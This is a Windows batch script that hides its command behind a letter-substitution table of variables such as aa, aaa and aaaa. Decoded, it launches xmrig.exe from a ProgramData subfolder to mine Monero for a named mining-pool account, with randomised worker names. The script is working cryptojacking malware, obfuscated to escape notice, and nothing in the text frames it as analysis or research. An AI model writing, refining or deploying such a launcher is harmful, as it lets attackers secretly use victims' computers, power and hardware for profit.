@echo off
set aa=a
set aaa=b
set aaaa=c
set aaaaa=d
set aaaaaa=e
set aaaaaaa=f
set aaaaaaaa=g
set aaaaaaaaa=h
set aaaaaaaaaa=i
set aaaaaaaaaaa=j
set aaaaaaaaaaaa=k
set aaaaaaaaaaaaa=l
set aaaaaaaaaaaaaa=m
set aaaaaaaaaaaaaaa=n
set aaaaaaaaaaaaaaaa=o
set aaaaaaaaaaaaaaaaa=p
set aaaaaaaaaaaaaaaaaa=q
set aaaaaaaaaaaaaaaaaaa=r
set aaaaaaaaaaaaaaaaaaaa=s
set aaaaaaaaaaaaaaaaaaaaa=t
set aaaaaaaaaaaaaaaaaaaaaa=u
set aaaaaaaaaaaaaaaaaaaaaaa=v
set aaaaaaaaaaaaaaaaaaaaaaaa=w
set aaaaaaaaaaaaaaaaaaaaaaaaa=x
set aaaaaaaaaaaaaaaaaaaaaaaaaa=y
set aaaaaaaaaaaaaaaaaaaaaaaaaaa=z
"C:\P%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaa%D%aa%%aaaaaaaaaaaaaaaaaaaaa%%aa%\PSU\%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaa%.%aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaa%" --%aaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaaa% XMR --%aaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaa% "%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%.%aaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%.%aaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaa%:7777" --%aaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaa% "%aa%%aaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaa%00@%aaaaaaaa%%aaaaaaaaaaaaaa%%aa%%aaaaaaaaaa%%aaaaaaaaaaaaa%.%aaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaa%/%aa%%aaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaa%00-%random%%random%" -%aaaaaaaaaaaaaaaaaaaaa% 2
